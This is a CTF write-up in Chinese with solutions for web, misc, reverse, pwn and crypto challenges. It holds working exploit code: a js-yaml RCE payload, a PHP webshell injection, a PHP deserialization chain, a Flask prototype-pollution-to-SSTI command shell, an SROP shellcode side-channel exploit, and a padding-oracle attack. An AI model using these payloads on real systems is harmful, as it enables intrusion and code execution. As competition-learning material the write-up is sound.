# 1Rays WriteUps

# Web

## <strong>signal </strong>

js-yaml 覆盖 ejs 渲染的 toString()方法就 RCE 了。process.mainModule、dynamic import、process.binding 应该都行。

```javascript
name:
  toString: !!js/function "function(){ return process.mainModule.require('child_process').execSync('/readflag').toString()}"
```

写在 xxx.yaml 文件中。选定 yaml 格式上传。

## <strong>what's my name </strong>

```python
?d0g3=include"],"");}file_put_contents('./shell.php','<?php eval($_GET[0]);');//&name=%00lambda_74
```

burp 多次发包爆破写 shell

flag 在环境变量

## <strong>easy_unserialize </strong>

php 反序列化

```php
<?php
error_reporting(0);
class Good{
    public $g1;
    private $gg2;

    public function __construct($ggg3)
    {
        $this->gg2 = $ggg3;
    }

    public function __isset($arg1)
    {
        if(!preg_match("/a-zA-Z0-9~-=!\^\+\(\)/",$this->gg2))
        {
            if ($this->gg2)
            {
                $this->g1->g1=666;
            }
        }else{
            die("No");
        }
    }
}
class Luck{
    public $l1;
    public $ll2;
    private $md5;
    public $lll3;
    public function __construct($a)
    {
        $this->md5 = $a;
    }
    public function __toString()
    {
        $new = $this->l1;
        return $new();
    }

    public function __get($arg1)
    {
        $this->ll2->ll2('b2');
    }

    public function __unset($arg1)
    {
        if(md5(md5($this->md5)) == 666)
        {
            if(empty($this->lll3->lll3)){
                echo "There is noting";
            }
        }
    }
}

class To{
    public $t1;
    public $tt2;
    public $arg1;
    public function  __call($arg1,$arg2)
    {
        if(urldecode($this->arg1)===base64_decode($this->arg1))
        {
            echo $this->t1;
        }
    }
    public function __set($arg1,$arg2)
    {
        if($this->tt2->tt2)
        {
            echo "what are you doing?";
        }
    }
}
class You{
    public $y1;
    public function __wakeup()
    {
        unset($this->y1->y1);
    }
}
class Flag{
    public function __invoke()
    {
        echo "May be you can get what you want here";
        array_walk($this, function ($one, $two) {
            $three = new $two($one);
            foreach($three as $tmp){
                echo ($tmp.'<br>');
            }
        });
    }
}

if(isset($_POST['D0g3']))
{
    unserialize($_POST['D0g3']);
}else{
    highlight_file(__FILE__);
}
?>
```

```php
<?php
// error_reporting(0);
class Good{
    public $g1;
    private $gg2;
    public function __construct($g1, $gg2)
    {
        $this->g1 = $g1;
        $this->gg2 = $gg2;
    }

}
class Luck{
    public $l1;
    public $ll2;
    private $md5;
    public $lll3;
    public function __construct($l1, $ll2, $md5, $lll3)
    {
        $this->l1 = $l1;
        $this->ll2 = $ll2;
        $this->md5 = $md5;
        $this->lll3 = $lll3;
    }

}

class To{
    public $t1;
    public $tt2;
    public $arg1;
    public function  __construct($t1, $tt2, $arg1)
    {
        $this->t1 = $t1;
        $this->tt2 = $tt2;
        $this->arg1 = $arg1;
    }

}
class You{
    public $y1;
    public function  __construct($y1)
    {
        $this->y1 = $y1;
    }
}
class Flag{
    public function  __construct($arg1, $arg2)
    {
        $this->$arg1 = $arg2;
    }
}

// $flag0 = new Flag("Imagick", "vid:msl:/tmp/php*");
// $luck0 = new Luck($flag0, "", "", "");
// $luck1 = new Luck("", "", $luck0, "");
// $you1 = new You($luck1);

//phpinfo
$luck0 = new Luck("phpinfo", "", "", "");
$luck1 = new Luck("", "", $luck0, "");
$you1 = new You($luck1);

echo base64_encode(serialize($you1));
echo "</br>";
echo urlencode(serialize($you1));
?>
```

查看 phpinfo

```php
O%3A3%3A%22You%22%3A1%3A%7Bs%3A2%3A%22y1%22%3BO%3A4%3A%22Luck%22%3A4%3A%7Bs%3A2%3A%22l1%22%3Bs%3A0%3A%22%22%3Bs%3A3%3A%22ll2%22%3Bs%3A0%3A%22%22%3Bs%3A9%3A%22%00Luck%00md5%22%3BO%3A4%3A%22Luck%22%3A4%3A%7Bs%3A2%3A%22l1%22%3Bs%3A7%3A%22phpinfo%22%3Bs%3A3%3A%22ll2%22%3Bs%3A0%3A%22%22%3Bs%3A9%3A%22%00Luck%00md5%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22lll3%22%3Bs%3A0%3A%22%22%3B%7Ds%3A4%3A%22lll3%22%3Bs%3A0%3A%22%22%3B%7D%7D
```

flag 在环境变量，直接看 phpinfo 就行

## swagger doc

任意文件读

```php
POST /api-base/v0/search?file=/app/app.py&type=text HTTP/1.1
Host: 47.108.206.43:45842
Connection: close
Content-Type: application/json
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxIn0.78iq2inutDsG4QG9-AM7jkydZyaLgRwJ2AIo2oBiGFQ
Content-Length: 2

{}
```

源码

```python
#coding=gbk
import json
from flask import Flask, request,  jsonify,send_file,render_template_string
import jwt
import requests
from functools import wraps
from datetime import datetime
import os

app = Flask(__name__)
app.config['TEMPLATES_RELOAD']=True

app.config['SECRET_KEY'] = 'fake_flag'
current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
response0 = {
    'code': 0,
    'message': 'failed',
    'result': None
}
response1={
    'code': 1,
    'message': 'success',
    'result': current_time
}

response2 = {
    'code': 2,
    'message': 'Invalid request parameters',
    'result': None
}


def auth(func):
    @wraps(func)
    def decorated(*args, **kwargs):
        token = request.cookies.get('token')
        if not token:
            return 'Invalid token', 401
        try:
            payload = jwt.decode(token, app.config['SECRET_KEY'], algorithms=['HS256'])
            if payload['username'] == User.username and payload['password'] == User.password:
                return func(*args, **kwargs)
            else:
                return 'Invalid token', 401
        except:
            return 'Something error?', 500

    return decorated

@app.route('/',methods=['GET'])
def index():
    return send_file('api-docs.json', mimetype='application/json;charset=utf-8')

@app.route('/api-base/v0/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.json['username']
        password = request.json['password']
        User.setUser(username,password)
        token = jwt.encode({'username': username, 'password': password}, app.config['SECRET_KEY'], algorithm='HS256')
        User.setToken(token)
        return jsonify(response1)

    return jsonify(response2),400


@app.route('/api-base/v0/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.json['username']
        password = request.json['password']
        try:
            token = User.token
            payload = jwt.decode(token, app.config['SECRET_KEY'], algorithms=['HS256'])
            if payload['username'] == username and payload['password'] == password:
                response = jsonify(response1)
                response.set_cookie('token', token)
                return response
            else:
                return jsonify(response0), 401
        except jwt.ExpiredSignatureError:
            return 'Invalid token', 401
        except jwt.InvalidTokenError:
            return 'Invalid token', 401

    return jsonify(response2), 400

@app.route('/api-base/v0/update', methods=['POST', 'GET'])
@auth
def update_password():
    try:
        if request.method == 'POST':
            try:
                new_password = request.get_json()
                if new_password:

                    update(new_password, User)

                    updated_token = jwt.encode({'username': User.username, 'password': User.password},
                                               app.config['SECRET_KEY'], algorithm='HS256')
                    User.token = updated_token
                    response = jsonify(response1)
                    response.set_cookie('token',updated_token)
                    return response
                else:
                    return jsonify(response0), 401
            except:
                return "Something error?",505
        else:
            return jsonify(response2), 400

    except jwt.ExpiredSignatureError:
        return 'Invalid token', 401
    except jwt.InvalidTokenError:
        return 'Invalid token', 401

def update(src, dst):
    if hasattr(dst, '__getitem__'):
        for key in src:
            if isinstance(src[key], dict):
                 if key in dst and isinstance(src[key], dict):
                    update(src[key], dst[key])
                 else:
                     dst[key] = src[key]
            else:
                dst[key] = src[key]
    else:
        for key, value in src.items() :
            if hasattr(dst,key) and isinstance(value, dict):
                update(value,getattr(dst, key))
            else:
                setattr(dst, key, value)


@app.route('/api-base/v0/logout')
def logout():
    response = jsonify({'message': 'Logout successful!'})
    response.delete_cookie('token')
    return response


@app.route('/api-base/v0/search', methods=['POST','GET'])
@auth
def api():
    if request.args.get('file'):
        try:
            if request.args.get('id'):
                id = request.args.get('id')
            else:
                id = ''
            data = requests.get("http://127.0.0.1:8899/v2/users?file=" + request.args.get('file') + '&id=' + id)
            if data.status_code != 200:
                return data.status_code

            if request.args.get('type') == "text":

                return render_template_string(data.text)
            else:
                return jsonify(json.loads(data.text))
        except jwt.ExpiredSignatureError:
            return 'Invalid token', 401
        except jwt.InvalidTokenError:
            return 'Invalid token', 401
        except Exception:
            return 'something error?'
    else:
        return jsonify(response2)

class MemUser:
    def setUser(self, username, password):
        self.username = username
        self.password = password

    def setToken(self, token):
        self.token = token

    def __init__(self):
        self.username="admin"
        self.password="password"
        self.token=jwt.encode({'username': self.username, 'password': self.password}, app.config['SECRET_KEY'], algorithm='HS256')

if __name__ == '__main__':
    User = MemUser()
    app.run(host='0.0.0.0')
```

![](static/B3RRbPsV7oUDxkxE9HScVGOunld.png)

8899 端口的 api.py

```python
#coding=gbk
import json
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/v2/users', methods=['GET'])
def get_user_info():
    file_path = request.args.get('file')
    id = request.args.get('id')
    if file_path:
        try:
            with open(file_path, 'r') as file:
                file_content = file.read()
                if id:
                    data = json.loads(file_content)
                    for user in data['users']:
                        if user['id'] == int(id):
                            if user:
                                return user
                    else:
                        return 'not found', 404
            return file_content
        except FileNotFoundError:
            return 'error',500

if __name__ == '__main__':
    app.run(port=8899)
```

exp.py

```python
from requests import Session
from json import dumps


sess = Session()
headers = {
    "Content-Type": "application/json"
}
data = {
    "username": "user",
    "password": "user"
}
sess.post("http://ip:port/api-base/v0/register", data=dumps(data), headers=headers)
sess.post("http://ip:port/api-base/v0/login", data=dumps(data), headers=headers)
while True:
    data = {
        "username": "user",
        "password": "user",
        "__init__": {
            "__globals__": {
                "requests": {
                    "Response": {
                        "text": "{{().__class__.__base__.__subclasses__()[154].__init__.__globals__['popen']('" + input("$ ") + "').read()}}"
                    }
                }
            }
        }
    }
    sess.post("http://ip:port/api-base/v0/update", data=dumps(data), headers=headers)
    data = {}
    resp = sess.post("http://ip:port/api-base/v0/search?file=/app/app.py&type=text", data=dumps(data), headers=headers)
    print(resp.text)
```

# Misc

## <strong>签到处 </strong>

直接看图片

![](static/RI9rbie7yos8S6xCHLCc5lUonnf.png)

## 

## <strong>Nahida</strong>

```python
初次见面，我已经关注你很久了。我叫纳西妲，别看我像个孩子，我比任何一位大人都了解这个世界。所以，我可以用我的知识，换取你路上的见闻吗？
wink!
```

```python
a = open("Nahida!", "rb").read().hex()[::-1]
open("Nahida!.jpg", "wb").write(bytes.fromhex(a))
```

```python
天空长出眼睛是为了见证大地的美好，而本来就拥有双眼的人类，是在什么样的情况下，才需要靠「神之眼」观察这个世界呢？这个问题的答案，聪明的你能够明白吗？

冒险者啊，你的勇气和决心令我敬佩不已。你曾追寻着众多谜团，踏遍了危险与奇迹交织的大陆。然而，你或许未曾意识到，那个你一直在寻找的答案，早已出现在你的旅途。
```

slienteye，密码

```python
Nahida
```

## 

# Reverse

## 感觉有点点简单

```python
# import b64vary

b64table = "4KBbSzwWClkZ2gsr1qA+Qu0FtxOm6/iVcJHPY9GNp7EaRoDf8UvIjnL5MydTX3eh"
enc_key = b"the_key_"
ans = "6zviISn2McHsa4b108v29tbKMtQQXQHA+2+sTYLlg9v2Q2Pq8SP24Uw="

def enc_init(key):
    buf = []
    for i in range(0x40):
        buf.append(i)
    
    # t2 = []
    # for i in range(64):
    #     t2.append(enc_key[i % len(enc_key)])
    
    k = 0
    for i in range(64):
        # k = (t2[i] + buf[i] + k) % 64
        k = (key[i % len(key)] + buf[i] + k) % 64
        buf[k], buf[i] = buf[i], buf[k]
    
    return buf

def enc(data, key):
    buf = enc_init(key)

    result = bytearray(data)
    m = 0
    n = 0
    for i in range(len(result)):
        m = (m + 1) % 64
        n = (buf[m] + n) % 64
        buf[m], buf[n] = buf[n], buf[m]
        result[i] ^= (m ^ n) & buf[((m ^ n) + buf[m] + buf[n]) % 64]
    return result
# 反向
def dec_base(data : str, table):
    result = []
    for i in range(0, len(data), 4):
        d0 = 0
        if data[i] != '=':
            d0 = table.index(data[i])
        d1 = 0
        if data[i + 1] != '=':
            d1 = table.index(data[i + 1])
        d2 = 0
        if data[i + 2] != '=':
            d2 = table.index(data[i + 2])
        d3 = 0
        if data[i + 3] != '=':
            d3 = table.index(data[i + 3])
        
        r0 = d0 | ((d1 << 6) & 0xff)
        r1 = (d1 >> 2) | ((d2 << 4) & 0xff)
        r2 = (d2 >> 4) | ((d3 << 2) & 0xff)

        result.append(r0)
        result.append(r1)
        result.append(r2)
    return bytes(result)

aa = dec_base(ans, b64table)
print(aa)
bb = enc(aa, enc_key)
print(bb)
```

## 你见过蓝色的小鲸鱼

![](static/S3aJbbVzkoAxSOxZW3schN9Tnye.png)

blowfish

![](static/Ma7ZbBpdgoXfcMxR5Sic1SrEnzg.png)

此为 key（username）

![](static/LKRzbH9iKoDUoIxVTv1cvJUinmh.png)

![](static/Z2CZb535tonAarxOfA2czMaNnjg.png)

Ans

![](static/C6N6bok5aoBMMExTA8qcNdS7nDg.png)

Check

调试发现就是简单 blowfish，没有别的

```python
from Crypto.Cipher import Blowfish

ans = [  0x11, 0xA5, 0x1F, 0x04, 0x95, 0x50, 0xE2, 0x50, 0x8F, 0x17, 
  0xE1, 0x6C, 0xF1, 0x63, 0x2B, 0x47]
ans = bytes(ans)

key = b'UzBtZTBuZV9EMGcz'

d = Blowfish.new(key, Blowfish.MODE_ECB)
res = d.decrypt(ans)
print(res)

r2 = d.encrypt(ans)
print(r2)
```

## mobilego

![](static/GwMebZfIxos2zJxpak8cWSH8n4c.png)

经典 native

frida 走起

```python
import frida
import sys

payload = '''
function getResource()
{
    Java.choose("com.example.mobilego.MainActivity", {
        onMatch:function(instance){
            console.log("[+] find MainActivity");

            console.log(instance.getResources().getString(0x7f0f0028));
        },onComplete:function(){
            console.log("[+] Search complete!");
        }
    });
}

Java.perform(function(){
    // getResource();   //主动调用会导致下面代码出现问题，不可同时启用

    var game = Java.use("game.Game");
    console.log(game.checkflag("1234567890abcdefghijklmnopqrstuvwxyzAB"));
    /*
    Interceptor.attach("game.Game.checkflag", {
        onEnter(args) {
            console.log("[+] check");
            console.log(args[0]);
        }
    })
    */

})
'''

def on_message(message, data):
    print("[%s] => %s" % (message, data))

if __name__ == '__main__':
    device = frida.get_usb_device()
    app = device.get_frontmost_application()
    print(app)
    pid = device.get_frontmost_application().pid

    session = device.attach(pid)

    script = session.create_script(payload)
    script.on('message', on_message)
    script.load()

    print("[!] Ctrl+Z to detach")
    sys.stdin.read()

    session.detach()
```

checkflag 似乎只有置换，可以输入一个长度相同的测试样例。

```python
ans = '49021}5f919038b440139g74b7Dc88330e5d{6'

print(len(ans))

ref = '1234567890abcdefghijklmnopqrstuvwxyzAB'

print(len(ref))

ref_res = 'lybteB0jufascop6g2i8k3nm9q17Avr4wxzd5h'

flag = []
for i in range(len(ans)):
    k = ref_res.index(ref[i])
    flag.append(ans[k])

flag = ''.join(flag)
print(flag)
```

## 你好,PE

![](static/JzH9buvR8oQdRWxTnHFcCEhqnTh.png)

PE32

发现 resource

![](static/GE96bOVLZo3QkXxVOB8cGRoundb.png)

调试，发现载入了这个内存并运行。

导出段 0x10000000

![](static/Qf6hbUoTno6D84xcYpvcWvkqn8y.png)

这里是程序主要逻辑

![](static/CN9fbbemTotrH0xFxD2cCQFWnnf.png)

根据内存地址找到 ans

![](static/BvvkbNmUvowzCHx00qjcDLWTnVf.png)

加密逻辑，有点像 crc

```python
ans = [  0x4D, 0xB8, 0x76, 0x29, 0xF5, 0xA9, 0x9E, 0x59, 0x55, 0x56, 
    0xB1, 0xC4, 0x2F, 0x21, 0x2C, 0x30, 0xB3, 0x79, 0x78, 0x17, 
    0xA8, 0xED, 0xF7, 0xDB, 0xE1, 0x53, 0xF0, 0xDB, 0xE9, 0x03, 
    0x51, 0x5E, 0x09, 0xC1, 0x00, 0xDF, 0xF0, 0x96, 0xFC, 0xC1, 
    0xB5, 0xE6, 0x62, 0x95, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00]

def packa(data) -> int:
    result = 0
    for i in range(8):
        result |= data[i] << (i * 8)
    return result

ans_p = [packa(ans[x:]) for x in range(0, 48, 8)]
# print(hex(ans_p[0]))

def enc_block(block):
    for j in range(64):
        if block & 0x80000000_00000000 != 0:
            block = ((block << 1) & 0xffffffff_ffffffff) ^ 0x054aa4a9
        else:
            block = (block << 1) & 0xffffffff_ffffffff
    return block

def dec_block(block):
    for j in range(64):
        if block & 1 != 0:
            block = ((block ^ 0x054aa4a9) >> 1) | 0x80000000_00000000
        else:
            block = block >> 1
    return block

def enc(data):
    result = []
    for i in range(48 >> 3):
        block = packa(data[i * 8])

        block = enc_block(block)
        
        result.extend(int.to_bytes(block, 8, 'little'))

ress = b''.join([int.to_bytes(dec_block(ans_p[x]), 8, 'little') for x in range(6)])
print(ress)
```

## 牢大想你了

Unity, il2cpp

![](static/V9HpbDvwvovqG3xadMPcITeHnbf.png)

有人没删干净打包文件（乐），可以找到 Assembly-CSharp.dll

![](static/O3TJb9pz9oAAGoxw93NczfaAnhf.png)

有混淆，这不是 tea 吗？

![](static/YLcjb7DQQoJY2Ax5aT3coM6mn1g.png)

OnValueChanged 是 check，str 是 key，array 是 ans，算法为 tea

![](static/RvFLbSnl2o0dUGxjj58c6HcYnyh.png)

```python
key = [0x11111111, 0x11111111, 0x11111111, 0x11111111]

def dec_block(a, b, key):
    delta = 2654435769
    s = (delta * 32) & 0xffffffff
    for i in range(32):
        b -= ((a << 4) + key[2] ^ a + s ^ (a >> 5) + key[3])
        b &= 0xffffffff
        a -= ((b << 4) + key[0] ^ b + s ^ (b >> 5) + key[1])
        a &= 0xffffffff
        s = (s - delta) & 0xffffffff
    return (a, b)

def dec(data, key):
    result = []
    for i in range(0, len(data) - 1, 2):
        result.extend(dec_block(data[i], data[i + 1], key))
    return result

dat = [3363017039,
    1247970816,
    549943836,
    445086378,
    3606751618,
    1624361316,
    3112717362,
    705210466,
    3343515702,
    2402214294,
    4010321577,
    2743404694]

res = dec(dat, key)

fs = []
for i in res:
    byte_block = int.to_bytes(i, 4, 'little')
    fs.append(byte_block)

flag = b''.join(fs)
print(flag)
```

# Pwn

## <strong>side_channel , initiate!</strong>

srop 改 bss 段执行权限写 shellcode，然后侧信道爆破 flag

```python
from pwn import*
context.arch = 'amd64'
s = "{}=-abcdefghijklmnopqrstuvwxyz0123456789"
list = [ord(x) for x in s]
sh = """
mov rax,2
mov rdi,0x404570
mov rsi,0
mov rdx,0
syscall
mov rax,0
mov rdi,3
mov rsi,0x404600
mov rdx,0x40
syscall
mov rax,rsi
mov bl,byte ptr [rax+{}]
cmp bl,{}
ja $-3
"""
#若猜测的字符小于真实字符则会被卡死
index = 0
flag=""
while(1):
    l=32
    r=126
    ans=0
    while(l<=r):
        mid = (l+r)>>1
        buf = 0x404060
        bss_H = 0x405000
        rax_15_ret = 0x401193
        leave_ret = 0x401446
        syscall_rbp_ret = 0x40118a
        call_syscall = 0x401186
        payload = b""
        payload = payload.ljust(0x400,b'\0')
        sigframe = SigreturnFrame()
        sigframe.rax = 10
        sigframe.rdi = 0x404000
        sigframe.rsi = 0x2000
        sigframe.rdx = 7
        sigframe.rsp = buf+0x508
        sigframe.rbp = buf+0x508
        sigframe.rip = call_syscall
        payload+= p64(rax_15_ret) + p64(syscall_rbp_ret) + bytes(sigframe)
        payload = payload.ljust(0x500,b'\0')
        payload+= p64(buf+0x518) + b"./flag\0\0"
        payload +=asm(sh.format(index,mid))
        # p = process("./chall")
        p = remote("47.108.206.43",25678)
        p.recvline()
        p.send(payload)
        payload = b'a'*0x2a + p64(buf+0x400-8) + p64(leave_ret)
        T = time.time()
        # gdb.attach(p)
        p.recvline()
        p.send(payload)
        try:
            cur = p.recv(timeout=1)
            print(str(time.time()-T))
            if(time.time()-T>0.9):
                print("Too Small Too Small Too Small Too Small Too Small Too Small ")
                l=mid+1
            else:
                print("Big or Equal Big or Equal Big or Equal Big or Equal ")
                ans=mid
                r=mid-1
        except:
            print(str(time.time()-T))
            print("Big or Equal Big or Equal Big or Equal Big or Equal ")
            ans=mid
            r=mid-1
        p.close()
    flag+= chr(ans)
    print("Now Ans Now Ans Now Ans Now Ans Now Ans Now Ans Now Ans Now Ans " + flag)
    index = index+1
    if '}' in flag:
        break

print(flag)
```

# Crypto

## <strong>010101 </strong>

工作量证明爆破哈希

```python
import re
import sys
import requests
from pwn import *
from tqdm import tqdm

p = remote('124.71.177.14', 10001)
context.log_level = 'debug'
def getdigest(content):
    return  hashlib.sha256(str(content).encode('utf-8')).hexdigest()

def proof():
    p.recvuntil(b'SHA256(XXXX + ')
    x = p.recvline().decode().strip('\n').split("):")
    y = x[0]
    cipher = x[1]
    alphabet = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
    for a in alphabet:
        for b in alphabet:
            for c in alphabet:
                for d in alphabet:
                    string=a+b+c+d+y
                    if getdigest(string)==cipher:
                        return a+b+c+d
h = proof()
p.sendlineafter(b'Give Me XXXX:\n',h.encode())
p.recvall()
```

拿到数据之后，由于 p 中只有两位进行修改，直接爆破，拿到 p 之后，rsa 解密

```python
from Crypto.Util.number import *
import random
from gmpy2 import *
n = 805640647381360210672579499168416329275150659323936221081868373686280340012990271372085591914767248816038401810165058033940330461019271757980761303277161135929430948659179154385001623483258107676918447241051893758190863193268954361005697832401544357614599170189144713049739351729484783937808603702001907043867882317498436809903709332855408648254447444883766964320827824863161553753557704718341214294225871057724209904183591486966333025483551358327638553390277361121272640193886383412516291825750347571167975800526582315768348938776154165231402266265162870116794840514211071531139808006802731703121205554258817141985338587116077649278481314020969301091506581207428392739424946962899242031437307206192480164007855637991433552043149599728696205068301087488412270197860109834636893818096045190381852206055770099188016830833460622068029662540509481058782894949871364919951155564758179416601782109601263177114173336993054223391150883191882806513559836516910582832074323415498784792134422915333862988666601448922800646440285855751896045302973020265217204476556789584940882666649505533238045590038241143555684304744393441835019430979001564417935726605893902379640741960793092063754019934313616735956121374008178081565427807895008459284126027
p = '11011001001011111001101111011010111000000101101000101101000001010100011111011011011010010001010101010100101111000100001101000011011111001011011110110100100000000000101011000000111010100001011010110110101000011101101101101011000000111000001110110000110111110100111001110001101000101111101101010010000000010001101011100010100111110110101101000001100010011000100110100101110010110010110101000111100100100011001110000110001010100100000110010100111100001111011000010001010010100011100011111000010010001001011101011101111100110101011000111101011111101011100011000000111101000110000000110110000011100000111110110100101011101100100000010000000101001001110000101000011110110010000101101101001010010011111110110010111110110110001111101001001110111100010111011011101100101110110011101011100100100011010011000111111010101111010101010010011111011000010001100001001010101100011010000110000011000101100011010010110001111011101011111111000111010101100000110000100001101001001000111011011101011010011100110000100100011100000001001111010101111101000100011010011000001110010110010111111111000001111110101110100001100000011100101110010110001100010110000011000010000111101111111001100110111111101111110110011010010101010100011100111001000010101110001000011101111100111111000001011111010110101100101001010000101000001000110010010010110011111010101010010101010011000001011000110010100111101010001011010000000000111000010011001111111011111000001001001111111111111111111001101010110110101010101110001001010111000100000100000111111000100111100011100111100100011111100001111111110101100110010011100110011000011010111011110011011000101011000000100111101001110111000101011111101011111100100101111010101100101101110110100110110011110111110110010010100110101110000011110001011010101100000110010001100101011111110001110100111010100100011000111110010101101000111101010010000111000001110111000011101110111000110100010111000011001101111001110110001110111000001100111001001110001010110011111011000001010001110000100000100010011100111100111100101110000011110000111101100011010001101001'

c = 82573112855598840231696460992372555981529211447654907097962973969893283779042281773755324141183547778580659125594573957895700512876527956502308043831396692659726982605331739560725715646167314911517146198304172746474961315955974219345646969911083462684413271471664668443719767218416769705309658530322184116026017250953639378463040536790385851132817083332822696949843865361126040380089866058015434850447402266085121700016577922118869082003058272934470481241478311641421015947290872608422632152796400601333682248243085597246822690591028893631929775939107968787870970338091735668396792989945910766797857994540120024995482123284111805921432556638050647836124430070380059114058201414412583580998963564253882768304012886365330467506839213817897406844685508730721010750949909586262206014104495395562015097252639103588365906610361537547372145739454131156832750492210615378819102026419931785821370376212477333092453940144174881890659632545486353650123589285304186189937479412216626526229120789277298003152862436637648441510288867290859541292576442178004407989143961740521304095256462989911295528940563371741914118944467897669587351524436733125971127912300553874005290846533545609524556097836543541931152253196405985967227784501425659027817457
f = 0
for i in range(0,1024):
    if p[i] == '0':
        temp1 = p[:i]+'1'+p[i+1:1024]
        for j in range(1024,2048):
            if p[j] == '1':
                temp2 = p[1024:j] + '0' + p[j+1:]
                x = int(temp1+temp2,2)
                g = gcd(n,x)
                if isPrime(g):
                    print(g)
                    f = 1
                    break
        if f == 1:
            break
                    

p  = g
q = n//p
e = 65537
d = inverse(e,p-1)
print(long_to_bytes(pow(c,d,p)))
```

## <strong>POA</strong><strong> </strong>

工作量证明爆破哈希

预言填充攻击直接打

```python
import re
import sys
import requests
from pwn import *
from tqdm import tqdm

p = remote('124.71.177.14', 10010)
context.log_level = 'debug'
def getdigest(content):
    return  hashlib.sha256(str(content).encode('utf-8')).hexdigest()

def proof():
    p.recvuntil(b'SHA256(XXXX + ')
    x = p.recvline().decode().strip('\n').split("):")
    y = x[0]
    cipher = x[1]
    alphabet = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
    for a in alphabet:
        for b in alphabet:
            for c in alphabet:
                for d in alphabet:
                    string=a+b+c+d+y
                    if getdigest(string)==cipher:
                        return a+b+c+d
h = proof()
p.sendlineafter(b'Give Me XXXX:\n',h.encode())

def getflag():
    p.sendline("1")
    p.recvuntil(b"This is your flag: ")
    cipher = p.recvline().strip()
    iv = bytes.fromhex(cipher[:32].decode())
    c = bytes.fromhex(cipher[32:].decode())
    return iv,c

def dec(cipher):
    p.sendline( "2")
    p.sendlineafter(b"Please enter ciphertext:\n", cipher)
    
    return b'True' in p.recvline()

oldiv,c = getflag()

print(oldiv,c,len(c))
    
flag = []  
suf = []

for i in tqdm(range(1,17)):
    for j in range(256):
        payload = b"0"*(16-i) + bytes([j]) + bytes(suf) + c
        payload = payload.hex()    
        if dec(payload):
            flag.append(j ^ i)

            suf.insert(0, j)
            for v in range(len(suf)):
                suf[v] = suf[v] ^ i ^ (i+1)
                
            break

b = flag[::-1]
true_flag = ''
for i in range(len(flag)):
    true_flag += chr(oldiv[i]^b[i])

print(true_flag)
```

## <strong>Rabin</strong>

工作量证明，哈希爆破，拿数据

```python
import re
import sys
import requests
from pwn import *
from tqdm import tqdm

p = remote('124.71.177.14', 10100)
context.log_level = 'debug'
def getdigest(content):
    return  hashlib.sha256(str(content).encode('utf-8')).hexdigest()

def proof():
    p.recvuntil(b'SHA256(XXXX + ')
    x = p.recvline().decode().strip('\n').split("):")
    y = x[0]
    cipher = x[1]
    alphabet = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
    for a in alphabet:
        for b in alphabet:
            for c in alphabet:
                for d in alphabet:
                    string=a+b+c+d+y
                    if getdigest(string)==cipher:
                        return a+b+c+d
h = proof()
p.sendlineafter(b'Give Me XXXX:\n',h.encode())
p.recvall()
```

观察 r 的生成，每一次都是 2*x^k，由于 x 固定，所以拿两次 n 的值求 gcd 可以解出 r

之后根据 pq 逆元解方程成功分解 n

```python
n = 241236007573575202821949960017234707768076254550057027154574078722994638042870459921492713770362569112380467896069908347129371688691617656641443608578876373388338406095664593172846875186687651235258313355549660270838759907208070336755778334713235175863584706702999890339189160446890125696938830649294236515721237190172603767037300356982193910431730894021236137738041180874057587485778610986601202687785892059467443702464159444621398965384871316192904693227470157815915460830219020494224971639769959699923527353136742622465308566383608464969378964080469463026382033260927199471510403455769993688293742336324949936283018724959153603878603376021936700992946308253279875050087875088905267318782342243145380137626767809697266042464757869159128403479066181793922358451866964730023486752423047482344045753299745144543925555614532602913495268255804306238236458262261211860074265754178964990789597587424567975227215487708351156647929713186414607548734179059726402784572419953171253937614636741667871150904044567
inv_p = 32464479883109558964714340431490774778841908563472767776039542598756150094098551452218266387440151370111180896825577096964186957201060615937276906654224045833738199796912622121168814796502177762881327414676423821930372545573140603523432713663437566206072115977613105903178272566818766277800928434281710983955
inv_q = 106933031694936987277382338301470720915825554213992273103237108005926790514797421287422237765892210105717847659574154243195260093806267772366404034827522741798543132901887023891816247378058830466597673684016122503600571973618760056334243692136163823156104849988923068455627419915465222661144412680782307684363
c1 = 201245183655300450426179249656350460459166051691936776928720840189555194263471453858906955612524408509506861124212576146479532142681493980588267542124073592053549569054450554961139381794079315091385147065676552838546218071732923892174345996994558661018160046606980075526156954783983761985740876006314963786030016767918233437037863672531395716511824657795969645195386757915463510542933992466653399136271410732697876366921062294213049440797722681716011412405172793280001501904159764006537552535771648917878299455196415465009414143260676333066129138501904271704996065150789067378792225788866147365241520857312940169775694238698662901245323135787296897220134453857506066494812250211749364837892859777264462898017061115810063522976405416424698948228876225701958313173235556457334361909024475887997079196335105350536906410119067294075659192041694951559269892973346716333020925898285468220109538252278241599762737204283993899823482440523922988227620808289725035120774325505561737760470528651973145041164562488
c2 = 231577862386098365297795207623530097842368848163783796657347542739541026345771363539941550504989011827231611122418064376424075346418549398609631526280493012088506993513335614077948380375815548173266216956054240686070517626164544119247849537844184589147502244596401988011352816951846320965440286416117805781394600004481676168312134676519161518050704697415520641502631416444120673170020530514132587836142174367205202784880290940659887759886217588549206754777987031502278986076428654891208215330234350659709214420830199078523139279928603330763124079999793259984256148737894606627458137666647689580487796499878969271937779251330766680321449486799689775422475255323699229431962878443410457347324338604327124665902888812378118476598105468817772558833183595190855299872311387611137939445672871239028530010875964439100275205195855001206386513535609520382301722691554493335695439666362495438246420718587408523141486841407242786065788791384186952717150153583824099041020242355119442320011615844307145968669910610
from Crypto.Util.number import *
from z3 import * 
from gmpy2 import *

